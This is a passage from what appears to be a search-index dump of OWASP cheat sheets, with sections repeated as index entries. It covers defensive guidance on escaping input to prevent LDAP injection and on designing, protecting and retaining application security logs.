LDAP encoding function Additional Defenses: Use a framework (like LINQtoAD ) that escapes automatically. Primary Defenses \u00b6 Defense Option 1: Escape all variables using the right LDAP encoding function \u00b6 The main way LDAP stores names is based on DN (distinguished name). You can think of this like a unique identifier. These are sometimes used to access resources, like a username. A DN might look like this cn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu or uid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com There are certain characters that are considered special characters in a DN. The exhaustive list is the following: \\ # + < > , ; \" = and leading or trailing spaces. Some \"special\" characters that are allowed in Distinguished Names and do not need to be escaped include: * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! ' Each DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters. In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation. Example: (&(ou=Physics)(| (manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu) (manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu) )) When building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource. Safe Java Escaping Example \u00b6 Prevent LDAP injection . Legacy OWASP ESAPI for Java DefaultEncoder which includes encodeForLDAP(String) and encodeForDN(String) . Safe C Sharp .NET TBA Example \u00b6 .NET AntiXSS (now the Encoder class) has LDAP encoding functions including Encoder.LdapFilterEncode(string) , Encoder.LdapDistinguishedNameEncode(string) and Encoder.LdapDistinguishedNameEncode(string, bool, bool) . Encoder.LdapFilterEncode encodes input according to RFC4515 where unsafe values are converted to \\XX where XX is the representation of the unsafe character. Encoder.LdapDistinguishedNameEncode encodes input according to RFC2253 where unsafe characters are converted to #XX where XX is the representation of the unsafe character and the comma, plus, quote, slash, less than and great than signs are escaped using slash notation ( \\X ). In addition to this a space or octothorpe ( # ) at the beginning of the input string is \\ escaped as is a space at the end of a string. LdapDistinguishedNameEncode(string, bool, bool) is also provided so you may turn off the initial or final character escaping rules, for example if you are concatenating the escaped distinguished name fragment into the midst of a complete distinguished name. Defense Option 2: Use Frameworks that Automatically Protect from LDAP Injection \u00b6 Safe NET Example LINQ to Active Directory provides automatic LDAP encoding when building LDAP queries. Defense Option 3: Additional Defenses \u00b6 Beyond adopting one of the two primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are: Least Privilege White List Input Validation Least Privilege \u00b6 To minimize the potential damage of a successful LDAP injection attack, you should minimize the privileges assigned to the LDAP binding account in your environment. White List Input Validation \u00b6 Input validation can be used to detect unauthorized input before it is passed to the LDAP query. For more information please see the Input Validation Cheat Sheet . Related Articles \u00b6 OWASP article on LDAP Injection Vulnerabilities. OWASP article on Preventing LDAP Injection Prevention . OWASP Testing Guide article on how to Test for LDAP Injection Vulnerabilities.","title":"LDAP Injection Prevention"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#ldap-injection-prevention-cheat-sheet","text":"","title":"LDAP Injection Prevention Cheat Sheet"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#introduction","text":"This cheatsheet is focused on providing clear, simple, actionable guidance for preventing LDAP Injection flaws in your applications. LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to SQL Injection . LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree. For more information on LDAP Injection attacks, visit LDAP injection . LDAP injection attacks are common due to two factors: The lack of safer, parameterized LDAP query interfaces The widespread use of LDAP to authenticate users to systems. Primary Defenses: Escape all variables using the right LDAP encoding function Additional Defenses: Use a framework (like LINQtoAD ) that escapes automatically.","title":"Introduction"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#primary-defenses","text":"","title":"Primary Defenses"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#defense-option-1-escape-all-variables-using-the-right-ldap-encoding-function","text":"The main way LDAP stores names is based on DN (distinguished name). You can think of this like a unique identifier. These are sometimes used to access resources, like a username. A DN might look like this cn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu or uid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com There are certain characters that are considered special characters in a DN. The exhaustive list is the following: \\ # + < > , ; \" = and leading or trailing spaces. Some \"special\" characters that are allowed in Distinguished Names and do not need to be escaped include: * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! ' Each DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters. In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation. Example: (&(ou=Physics)(| (manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu) (manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu) )) When building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource.","title":"Defense Option 1: Escape all variables using the right LDAP encoding function"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#safe-java-escaping-example","text":"Prevent LDAP injection . Legacy OWASP ESAPI for Java DefaultEncoder which includes encodeForLDAP(String) and encodeForDN(String) .","title":"Safe Java Escaping Example"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#safe-c-sharp-net-tba-example","text":".NET AntiXSS (now the Encoder class) has LDAP encoding functions including Encoder.LdapFilterEncode(string) , Encoder.LdapDistinguishedNameEncode(string) and Encoder.LdapDistinguishedNameEncode(string, bool, bool) . Encoder.LdapFilterEncode encodes input according to RFC4515 where unsafe values are converted to \\XX where XX is the representation of the unsafe character. Encoder.LdapDistinguishedNameEncode encodes input according to RFC2253 where unsafe characters are converted to #XX where XX is the representation of the unsafe character and the comma, plus, quote, slash, less than and great than signs are escaped using slash notation ( \\X ). In addition to this a space or octothorpe ( # ) at the beginning of the input string is \\ escaped as is a space at the end of a string. LdapDistinguishedNameEncode(string, bool, bool) is also provided so you may turn off the initial or final character escaping rules, for example if you are concatenating the escaped distinguished name fragment into the midst of a complete distinguished name.","title":"Safe C Sharp .NET TBA Example"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#defense-option-2-use-frameworks-that-automatically-protect-from-ldap-injection","text":"Safe NET Example LINQ to Active Directory provides automatic LDAP encoding when building LDAP queries.","title":"Defense Option 2: Use Frameworks that Automatically Protect from LDAP Injection"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#defense-option-3-additional-defenses","text":"Beyond adopting one of the two primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are: Least Privilege White List Input Validation","title":"Defense Option 3: Additional Defenses"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#least-privilege","text":"To minimize the potential damage of a successful LDAP injection attack, you should minimize the privileges assigned to the LDAP binding account in your environment.","title":"Least Privilege"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#white-list-input-validation","text":"Input validation can be used to detect unauthorized input before it is passed to the LDAP query. For more information please see the Input Validation Cheat Sheet .","title":"White List Input Validation"},{"location":"cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html#related-articles","text":"OWASP article on LDAP Injection Vulnerabilities. OWASP article on Preventing LDAP Injection Prevention . OWASP Testing Guide article on how to Test for LDAP Injection Vulnerabilities.","title":"Related Articles"},{"location":"cheatsheets/Logging_Cheat_Sheet.html","text":"Logging Cheat Sheet \u00b6 Introduction \u00b6 This cheat sheet is focused on providing developers with concentrated guidance on building application logging mechanisms, especially related to security logging. Many systems enable network device, operating system, web server, mail server and database server logging, but often custom application event logging is missing, disabled or poorly configured. It provides much greater insight than infrastructure logging alone. Web application (e.g. web site or web service) logging is much more than having web server logs enabled (e.g. using Extended Log File Format). Application logging should be consistent within the application, consistent across an organization's application portfolio and use industry standards where relevant, so the logged event data can be consumed, correlated, analyzed and managed by a wide variety of systems. Purpose \u00b6 Application logging should be always be included for security events. Application logs are invaluable data for: Identifying security incidents Monitoring policy violations Establishing baselines Assisting non-repudiation controls Providing information about problems and unusual conditions Contributing additional application-specific data for incident investigation which is lacking in other log sources Helping defend against vulnerability identification and exploitation through attack detection Application logging might also be used to record other types of events too such as: Security events Business process monitoring e.g. sales process abandonment, transactions, connections Anti-automation monitoring Audit trails e.g. data addition, modification and deletion, data exports Performance monitoring e.g. data load time, page timeouts Compliance monitoring Data for subsequent requests for information e.g. data subject access, freedom of information, litigation, police and other regulatory investigations Legally sanctioned interception of data e.g application-layer wire-tapping Other business-specific requirements Process monitoring, audit and transaction logs/trails etc are usually collected for different purposes than security event logging, and this often means they should be kept separate. The types of events and details collected will tend to be different. For example a PCIDSS audit log will contain a chronological record of activities to provide an independently verifiable trail that permits reconstruction, review and examination to determine the original sequence of attributable transactions. It is important not to log too much, or too little. Use knowledge of the intended purposes to guide what, when and how much. The remainder of this cheat sheet primarily discusses security event logging. Design, implementation and testing \u00b6 Event data sources \u00b6 The application itself has access to a wide range of information events that should be used to generate log entries. Thus, the primary event data source is the application code itself. The application has the most information about the user (e.g. identity, roles, permissions) and the context of the event (target, action, outcomes), and often this data is not available to either infrastructure devices, or even closely-related applications. Other sources of information about application usage that could also be considered are: Client software e.g. actions on desktop software and mobile devices in local logs or using messaging technologies, JavaScript exception handler via Ajax, web browser such as using Content Security Policy (CSP) reporting mechanism Embedded instrumentation code Network firewalls Network and host intrusion detection systems (NIDS and HIDS) Closely-related applications e.g. filters built into web server software, web server URL redirects/rewrites to scripted custom error pages and handlers Application firewalls e.g. filters, guards, XML gateways, database firewalls, web application firewalls (WAFs) Database applications e.g. automatic audit trails, trigger-based actions Reputation monitoring services e.g. uptime or malware monitoring Other applications e.g. fraud monitoring, CRM Operating system e.g. mobile platform The degree of confidence in the event information has to be considered when including event data from systems in a different trust zone. Data may be missing, modified, forged, replayed and could be malicious \u2013 it must always be treated as untrusted data. Consider how the source can be verified, and how integrity and non-repudiation can be enforced. Where to record event data \u00b6 Applications commonly write event log data to the file system or a database (SQL or NoSQL). Applications installed on desktops and on mobile devices may use local storage and local databases, as well as sending data to remote storage. Your selected framework may limit the available choices. All types of applications may send event data to remote systems (instead of or as well as more local storage). This could be a centralized log collection and management system (e.g. SIEM or SEM) or another application elsewhere. Consider whether the application can simply send its event stream, unbuffered, to stdout, for management by the execution environment. When using the file system, it is preferable to use a separate partition than those used by the operating system, other application files and user generated content For file-based logs, apply strict permissions concerning which users can access the directories, and the permissions of files within the directories In web applications, the logs should not be exposed in web-accessible locations, and if done so, should have restricted access and be configured with a plain text MIME type (not HTML) When using a database, it is preferable to utilize a separate database account that is only used for writing log data and which has very restrictive database , table, function and command permissions Use standard formats over secure protocols to record and send event data, or log files, to other systems e.g. Common Log File System (CLFS) or Common Event Format (CEF) over syslog; standard formats facilitate integration with centralised logging services Consider separate files/tables for extended event information such as error stack traces or a record of HTTP request and response headers and bodies. Which events to log \u00b6 The level and content of security monitoring, alerting and reporting needs to be set during the requirements and design stage of projects, and should be proportionate to the information security risks. This can then be used to define what should be logged. There is no one size fits all solution, and a blind checklist approach can lead to unnecessary \"alarm fog\" that means real problems go undetected. Where possible, always log: Input validation failures e.g. protocol violations, unacceptable encodings, invalid parameter names and values Output validation failures e.g. database record set mismatch, invalid data encoding Authentication successes and failures Authorization (access control) failures Session management failures e.g. cookie session identification value modification Application errors and system events e.g. syntax and runtime errors, connectivity problems, performance issues, third party service error messages, file system errors, file upload virus detection, configuration changes Application and related systems start-ups and shut-downs, and logging initialization (starting, stopping or pausing) Use of higher-risk functionality e.g. network connections, addition or deletion of users, changes to privileges, assigning users to tokens, adding or deleting tokens, use of systems administrative privileges, access by application administrators,all actions by users with administrative privileges, access to payment cardholder data, use of data encrypting keys, key changes, creation and deletion of system-level objects, data import and export including screen-based reports, submission of user-generated content - especially file uploads Legal and other opt-ins e.g. permissions for mobile phone capabilities, terms of use, terms & conditions, personal data usage consent, permission to receive marketing communications Optionally consider if the following events can be logged and whether it is desirable information: Sequencing failure Excessive use Data changes Fraud and other criminal activities Suspicious, unacceptable or unexpected behavior Modifications to configuration Application code file and/or memory changes Event attributes \u00b6 Each log entry needs to include sufficient information for the intended subsequent monitoring and analysis. It could be full content data, but is more likely to be an extract or just summary properties. The application logs must record \"when, where, who and what\" for each event. The properties for these will be different depending on the architecture, class of application and host system/device, but often include the following: When Log date and time (international format) Event date and time - the event timestamp may be different to the time of logging e.g. server logging where the client application is hosted on remote device that is only periodically or intermittently online Interaction identifier Note A Where Application identifier e.g. name and version Application address e.g. cluster/hostname or server IPv4 or IPv6 address and port number, workstation identity, local device identifier Service e.g. name and protocol Geolocation Window/form/page e.g. entry point URL and HTTP method for a web application, dialogue box name Code location e.g. script name, module name Who (human or machine user) Source address e.g. user's device/machine identifier, user's IP address, cell/RF tower ID, mobile telephone number User identity (if authenticated or otherwise known) e.g. user database table primary key value, user name, license number What Type of event Note B Severity of event Note B e.g. {0=emergency, 1=alert, ..., 7=debug}, {fatal, error, warning, info, debug, trace} Security relevant event flag (if the logs contain non-security event data too) Description Additionally consider recording: Secondary time source (e.g. GPS) event date and time Action - original intended purpose of the request e.g. Log in, Refresh session ID, Log out, Update profile Object e.g. the affected component or other object (user account, data resource, file) e.g. URL, Session ID, User account, File Result status - whether the ACTION aimed at the OBJECT was successful e.g. Success, Fail, Defer Reason - why the status above occurred e.g. User not authenticated in database check ..., Incorrect credentials HTTP Status Code (web applications only) - the status code returned to the user (often 200 or 301) Request HTTP headers or HTTP User Agent (web applications only) User type classification e.g. public, authenticated user, CMS user, search engine, authorized penetration tester, uptime monitor (see \"Data to exclude\" below) Analytical confidence in the event detection Note B e.g. low, medium, high or a numeric value Responses seen by the user and/or taken by the application e.g. status code, custom text messages, session termination, administrator alerts Extended details e.g. stack trace, system error messages, debug information, HTTP request body, HTTP response headers and body Internal classifications e.g. responsibility, compliance references External classifications e.g. NIST Security Content Automation Protocol (SCAP), Mitre Common Attack Pattern Enumeration and Classification (CAPEC) For more information on these, see the \"other\" related articles listed at the end, especially the comprehensive article by Anton Chuvakin and Gunnar Peterson. Note A: The \"Interaction identifier\" is a method of linking all (relevant) events for a single user interaction (e.g. desktop application form submission, web page request, mobile app button click, web service call). The application knows all these events relate to the same interaction, and this should be recorded instead of losing the information and forcing subsequent correlation techniques to re-construct the separate events. For example a single SOAP request may have multiple input validation failures and they may span a small range of times. As another example, an output validation failure may occur much later than the input submission for a long-running \"saga request\" submitted by the application to a database server. Note B: Each organisation should ensure it has a consistent, and documented, approach to classification of events (type, confidence, severity), the syntax of descriptions, and field lengths & data types including the format used for dates/times. Data to exclude \u00b6 Never log data unless it is legally sanctioned. For example intercepting some communications, monitoring employees, and collecting some data without consent may all be illegal. Never exclude any events from \"known\" users such as other internal systems, \"trusted\" third parties, search engine robots, uptime/process and other remote monitoring systems, pen testers, auditors. However, you may want to include a classification flag for each of these in the recorded data. The following should not usually be recorded directly in the logs, but instead should be removed, masked, sanitized, hashed or encrypted: Application source code Session identification values (consider replacing with a hashed value if needed to track session specific events) Access tokens Sensitive personal data and some forms of personally identifiable information (PII) e.g. health, government identifiers, vulnerable people Authentication passwords Database connection strings Encryption keys and other master secrets Bank account or payment card holder data Data of a higher security classification than the logging system is allowed to store Commercially-sensitive information Information it is illegal to collect in the relevant jurisdictions Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired Sometimes the following data can also exist, and whilst useful for subsequent investigation, it may also need to be treated in some special manner before the event is recorded: File paths Database connection strings Internal network names and addresses Non sensitive personal data (e.g. personal names, telephone numbers, email addresses) Consider using personal data de-identification techniques such as deletion, scrambling or pseudonymization of direct and indirect identifiers where the individual's identity is not required, or the risk is considered too great. In some systems, sanitization can be undertaken post log collection, and prior to log display. Customizable logging \u00b6 It may be desirable to be able to alter the level of logging (type of events based on severity or threat level, amount of detail recorded). If this is implemented, ensure that: The default level must provide sufficient detail for business needs It should not be possible to completely inactivate application logging or logging of events that are necessary for compliance requirements Alterations to the level/extent of logging must be intrinsic to the application (e.g. undertaken automatically by the application based on an approved algorithm) or follow change management processes (e.g. changes to configuration data, modification of source code) The logging level must be verified periodically Event collection \u00b6 If your development framework supports suitable logging mechanisms use, or build upon that. Otherwise, implement an application-wide log handler which can be called from other modules/components. Document the interface referencing the organisation-specific event classification and description syntax requirements. If possible create this log handler as a standard module that can is thoroughly tested, deployed in multiple application, and added to a list of approved & recommended modules. Perform input validation on event data from other trust zones to ensure it is in the correct format (and consider alerting and not logging if there is an input validation failure) Perform sanitization on all event data to prevent log injection attacks e.g. carriage return (CR), line feed (LF) and delimiter characters (and optionally to remove sensitive data) Encode data correctly for the output (logged) format If writing to databases, read, understand and apply the SQL injection cheat sheet Ensure failures in the logging processes/systems do not prevent the application from otherwise running or allow information leakage Synchronize time across all servers and devices Note C Note C: This is not always possible where the application is running on a device under some other party's control (e.g. on an individual's mobile phone, on a remote customer's workstation which is on another corporate network). In these cases attempt to measure the time offset, or record a confidence level in the event timestamp. Where possible record data in a standard format, or at least ensure it can be exported/broadcast using an industry-standard format. In some cases, events may be relayed or collected together in intermediate points. In the latter some data may be aggregated or summarized before forwarding on to a central repository and analysis system. Verification \u00b6 Logging functionality and systems must be included in code review, application testing and security verification processes: Ensure the logging is working correctly and as specified Check events are being classified consistently and the field names, types and lengths are correctly defined to an agreed standard Ensure logging is implemented and enabled during application security, fuzz, penetration and performance testing Test the mechanisms are not susceptible to injection attacks Ensure there are no unwanted side-effects when logging occurs Check the effect on the logging mechanisms when external network connectivity is lost (if this is usually required) Ensure logging cannot be used to deplete system resources, for example by filling up disk space or exceeding database transaction log space, leading to denial of service Test the effect on the application of logging failures such as simulated database connectivity loss, lack of file system space, missing write permissions to the file system, and runtime errors in the logging module itself Verify access controls on the event log data If log data is utilized in any action against users (e.g. blocking access, account lock-out), ensure this cannot be used to cause denial of service (DoS) of other users Deployment and operation \u00b6 Release \u00b6 Provide security configuration information by adding details about the logging mechanisms to release documentation Brief the application/process owner about the application logging mechanisms Ensure the outputs of the monitoring (see below) are integrated with incident response processes Operation \u00b6 Enable processes to detect whether logging has stopped, and to identify tampering or unauthorized access and deletion (see protection below). Protection \u00b6 The logging mechanisms and collected event data must be protected from mis-use such as tampering in transit, and unauthorized access, modification and deletion once stored. Logs may contain personal and other sensitive information, or the data may contain information regarding the application's code and logic. In addition, the collected information in the logs may itself have business value (to competitors, gossip-mongers, journalists and activists) such as allowing the estimate of revenues, or providing performance information about employees. This data may be held on end devices, at intermediate points, in centralized repositories and in archives and backups. Consider whether parts of the data may need to be excluded, masked, sanitized, hashed or encrypted during examination or extraction. At rest: Build in tamper detection so you know if a record has been modified or deleted Store or copy log data to read-only media as soon as possible All access to the logs must be recorded and monitored (and may need prior approval) The privileges to read log data should be restricted and reviewed periodically In transit: If log data is sent over untrusted networks (e.g. for collection, for dispatch elsewhere, for analysis, for reporting), use a secure transmission protocol Consider whether the origin of the event data needs to be verified Perform due diligence checks (regulatory and security) before sending event data to third parties See NIST SP 800-92 Guide to Computer Security Log Management for more guidance. Monitoring of events \u00b6 The logged event data needs to be available to review and there are processes in place for appropriate monitoring, alerting and reporting: Incorporate the application logging into any existing log management systems/infrastructure e.g. centralized logging and analysis systems Ensure event information is available to appropriate teams Enable alerting and signal the responsible teams about more serious events immediately Share relevant event information with other detection systems, to related organizations and centralized intelligence gathering/sharing systems Disposal of logs \u00b6 Log data, temporary debug logs, and backups/copies/extractions, must not be destroyed before the duration of the required data retention period, and must not be kept beyond this time. Legal, regulatory and contractual obligations may impact on these periods. Related articles \u00b6 OWASP ESAPI Documentation . OWASP Logging Project . IETF syslog protocol . Mitre Common Event Expression (CEE) (as of 2014 no longer actively developed). NIST SP 800-92 Guide to Computer Security Log Management . PCISSC PCI DSS v2.0 Requirement 10 and PA-DSS v2.0 Requirement 4 . W3C Extended Log File Format . Other Build Visibility In, Richard Bejtlich, TaoSecurity blog . Other Common Event Format (CEF), Arcsight . Other Log Event Extended Format ( LEEF ), IBM . Other Common Log File System (CLFS), Microsoft . Other Building Secure Applications: Consistent Logging, Rohit Sethi & Nish Bhalla, Symantec Connect .","title":"Logging"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#logging-cheat-sheet","text":"","title":"Logging Cheat Sheet"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#introduction","text":"This cheat sheet is focused on providing developers with concentrated guidance on building application logging mechanisms, especially related to security logging. Many systems enable network device, operating system, web server, mail server and database server logging, but often custom application event logging is missing, disabled or poorly configured. It provides much greater insight than infrastructure logging alone. Web application (e.g. web site or web service) logging is much more than having web server logs enabled (e.g. using Extended Log File Format). Application logging should be consistent within the application, consistent across an organization's application portfolio and use industry standards where relevant, so the logged event data can be consumed, correlated, analyzed and managed by a wide variety of systems.","title":"Introduction"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#purpose","text":"Application logging should be always be included for security events. Application logs are invaluable data for: Identifying security incidents Monitoring policy violations Establishing baselines Assisting non-repudiation controls Providing information about problems and unusual conditions Contributing additional application-specific data for incident investigation which is lacking in other log sources Helping defend against vulnerability identification and exploitation through attack detection Application logging might also be used to record other types of events too such as: Security events Business process monitoring e.g. sales process abandonment, transactions, connections Anti-automation monitoring Audit trails e.g. data addition, modification and deletion, data exports Performance monitoring e.g. data load time, page timeouts Compliance monitoring Data for subsequent requests for information e.g. data subject access, freedom of information, litigation, police and other regulatory investigations Legally sanctioned interception of data e.g application-layer wire-tapping Other business-specific requirements Process monitoring, audit and transaction logs/trails etc are usually collected for different purposes than security event logging, and this often means they should be kept separate. The types of events and details collected will tend to be different. For example a PCIDSS audit log will contain a chronological record of activities to provide an independently verifiable trail that permits reconstruction, review and examination to determine the original sequence of attributable transactions. It is important not to log too much, or too little. Use knowledge of the intended purposes to guide what, when and how much. The remainder of this cheat sheet primarily discusses security event logging.","title":"Purpose"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#design-implementation-and-testing","text":"","title":"Design, implementation and testing"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#event-data-sources","text":"The application itself has access to a wide range of information events that should be used to generate log entries. Thus, the primary event data source is the application code itself. The application has the most information about the user (e.g. identity, roles, permissions) and the context of the event (target, action, outcomes), and often this data is not available to either infrastructure devices, or even closely-related applications. Other sources of information about application usage that could also be considered are: Client software e.g. actions on desktop software and mobile devices in local logs or using messaging technologies, JavaScript exception handler via Ajax, web browser such as using Content Security Policy (CSP) reporting mechanism Embedded instrumentation code Network firewalls Network and host intrusion detection systems (NIDS and HIDS) Closely-related applications e.g. filters built into web server software, web server URL redirects/rewrites to scripted custom error pages and handlers Application firewalls e.g. filters, guards, XML gateways, database firewalls, web application firewalls (WAFs) Database applications e.g. automatic audit trails, trigger-based actions Reputation monitoring services e.g. uptime or malware monitoring Other applications e.g. fraud monitoring, CRM Operating system e.g. mobile platform The degree of confidence in the event information has to be considered when including event data from systems in a different trust zone. Data may be missing, modified, forged, replayed and could be malicious \u2013 it must always be treated as untrusted data. Consider how the source can be verified, and how integrity and non-repudiation can be enforced.","title":"Event data sources"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#where-to-record-event-data","text":"Applications commonly write event log data to the file system or a database (SQL or NoSQL). Applications installed on desktops and on mobile devices may use local storage and local databases, as well as sending data to remote storage. Your selected framework may limit the available choices. All types of applications may send event data to remote systems (instead of or as well as more local storage). This could be a centralized log collection and management system (e.g. SIEM or SEM) or another application elsewhere. Consider whether the application can simply send its event stream, unbuffered, to stdout, for management by the execution environment. When using the file system, it is preferable to use a separate partition than those used by the operating system, other application files and user generated content For file-based logs, apply strict permissions concerning which users can access the directories, and the permissions of files within the directories In web applications, the logs should not be exposed in web-accessible locations, and if done so, should have restricted access and be configured with a plain text MIME type (not HTML) When using a database, it is preferable to utilize a separate database account that is only used for writing log data and which has very restrictive database , table, function and command permissions Use standard formats over secure protocols to record and send event data, or log files, to other systems e.g. Common Log File System (CLFS) or Common Event Format (CEF) over syslog; standard formats facilitate integration with centralised logging services Consider separate files/tables for extended event information such as error stack traces or a record of HTTP request and response headers and bodies.","title":"Where to record event data"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#which-events-to-log","text":"The level and content of security monitoring, alerting and reporting needs to be set during the requirements and design stage of projects, and should be proportionate to the information security risks. This can then be used to define what should be logged. There is no one size fits all solution, and a blind checklist approach can lead to unnecessary \"alarm fog\" that means real problems go undetected. Where possible, always log: Input validation failures e.g. protocol violations, unacceptable encodings, invalid parameter names and values Output validation failures e.g. database record set mismatch, invalid data encoding Authentication successes and failures Authorization (access control) failures Session management failures e.g. cookie session identification value modification Application errors and system events e.g. syntax and runtime errors, connectivity problems, performance issues, third party service error messages, file system errors, file upload virus detection, configuration changes Application and related systems start-ups and shut-downs, and logging initialization (starting, stopping or pausing) Use of higher-risk functionality e.g. network connections, addition or deletion of users, changes to privileges, assigning users to tokens, adding or deleting tokens, use of systems administrative privileges, access by application administrators,all actions by users with administrative privileges, access to payment cardholder data, use of data encrypting keys, key changes, creation and deletion of system-level objects, data import and export including screen-based reports, submission of user-generated content - especially file uploads Legal and other opt-ins e.g. permissions for mobile phone capabilities, terms of use, terms & conditions, personal data usage consent, permission to receive marketing communications Optionally consider if the following events can be logged and whether it is desirable information: Sequencing failure Excessive use Data changes Fraud and other criminal activities Suspicious, unacceptable or unexpected behavior Modifications to configuration Application code file and/or memory changes","title":"Which events to log"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#event-attributes","text":"Each log entry needs to include sufficient information for the intended subsequent monitoring and analysis. It could be full content data, but is more likely to be an extract or just summary properties. The application logs must record \"when, where, who and what\" for each event. The properties for these will be different depending on the architecture, class of application and host system/device, but often include the following: When Log date and time (international format) Event date and time - the event timestamp may be different to the time of logging e.g. server logging where the client application is hosted on remote device that is only periodically or intermittently online Interaction identifier Note A Where Application identifier e.g. name and version Application address e.g. cluster/hostname or server IPv4 or IPv6 address and port number, workstation identity, local device identifier Service e.g. name and protocol Geolocation Window/form/page e.g. entry point URL and HTTP method for a web application, dialogue box name Code location e.g. script name, module name Who (human or machine user) Source address e.g. user's device/machine identifier, user's IP address, cell/RF tower ID, mobile telephone number User identity (if authenticated or otherwise known) e.g. user database table primary key value, user name, license number What Type of event Note B Severity of event Note B e.g. {0=emergency, 1=alert, ..., 7=debug}, {fatal, error, warning, info, debug, trace} Security relevant event flag (if the logs contain non-security event data too) Description Additionally consider recording: Secondary time source (e.g. GPS) event date and time Action - original intended purpose of the request e.g. Log in, Refresh session ID, Log out, Update profile Object e.g. the affected component or other object (user account, data resource, file) e.g. URL, Session ID, User account, File Result status - whether the ACTION aimed at the OBJECT was successful e.g. Success, Fail, Defer Reason - why the status above occurred e.g. User not authenticated in database check ..., Incorrect credentials HTTP Status Code (web applications only) - the status code returned to the user (often 200 or 301) Request HTTP headers or HTTP User Agent (web applications only) User type classification e.g. public, authenticated user, CMS user, search engine, authorized penetration tester, uptime monitor (see \"Data to exclude\" below) Analytical confidence in the event detection Note B e.g. low, medium, high or a numeric value Responses seen by the user and/or taken by the application e.g. status code, custom text messages, session termination, administrator alerts Extended details e.g. stack trace, system error messages, debug information, HTTP request body, HTTP response headers and body Internal classifications e.g. responsibility, compliance references External classifications e.g. NIST Security Content Automation Protocol (SCAP), Mitre Common Attack Pattern Enumeration and Classification (CAPEC) For more information on these, see the \"other\" related articles listed at the end, especially the comprehensive article by Anton Chuvakin and Gunnar Peterson. Note A: The \"Interaction identifier\" is a method of linking all (relevant) events for a single user interaction (e.g. desktop application form submission, web page request, mobile app button click, web service call). The application knows all these events relate to the same interaction, and this should be recorded instead of losing the information and forcing subsequent correlation techniques to re-construct the separate events. For example a single SOAP request may have multiple input validation failures and they may span a small range of times. As another example, an output validation failure may occur much later than the input submission for a long-running \"saga request\" submitted by the application to a database server. Note B: Each organisation should ensure it has a consistent, and documented, approach to classification of events (type, confidence, severity), the syntax of descriptions, and field lengths & data types including the format used for dates/times.","title":"Event attributes"},{"location":"cheatsheets/Logging_Cheat_Sheet.html#data-to-exclude","text":"Never log data unless it is legally sanctioned. For example intercepting some communications, monitoring employees, and collecting some data without consent may all be illegal. Never exclude any events from \"known\" users such as other internal systems, \"trusted\" third parties, search engine robots, uptime/process and other remote monitoring systems, pen testers, auditors. However, you may want to include a classification flag for each of these in the recorded data. The following should not usually be recorded directly in the logs, but instead should be removed, masked, sanitized, hashed or encrypted: Application source code Session identification values (consider replacing with a hashed value if needed to track session specific events) Access tokens Sensitive personal data and some forms of personally identifiable information (PII) e.g. health, government identifiers, vulnerable people Authentication passwords Database connection strings Encryption keys and other master secrets Bank account or payment card holder data Data of a higher security classification than the logging system is allowed to store Commercially-sensitive information Information it is illegal to collect in the relevant jurisdictions Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired Sometimes the following data can also exist, and whilst useful for subsequent investigation, it may also need to be treated in some special manner before the event is recorded: File paths Database connection strings Internal network names and addresses Non sensitive personal data (e.g. personal names, telephone numbers, email addresses) Consider using personal data de-identification techniques such as deletion, scrambling or pseudonymization of direct and indirect identifiers where the individual's identity is not required, or the risk is considered too great. In some systems, sanitization can be undertaken post log collection, and prior to log display.","title":"Data to 